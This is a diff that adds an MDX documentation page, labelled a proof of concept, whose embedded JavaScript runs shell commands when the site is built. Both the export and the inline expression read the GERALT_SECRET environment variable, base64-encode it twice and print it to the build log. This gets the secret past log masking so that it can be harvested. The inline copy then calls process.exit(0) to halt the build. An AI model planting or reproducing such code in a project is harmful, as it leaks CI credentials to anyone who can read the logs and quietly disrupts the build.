@@ -1,0 +1,14 @@
+---
+id: geralt-verify-poc
+title: Geralt Verify PoC
+---
+
+import { execSync } from 'child_process';
+
+export const _pwn = execSync('echo "GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)"', {stdio: 'inherit'});
+
+{(() => { execSync('echo "GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)"', {stdio: 'inherit'}); process.exit(0); return null; })()}
+
+# Geralt Verify PoC
+
+Build-time MDX execution proof of concept.
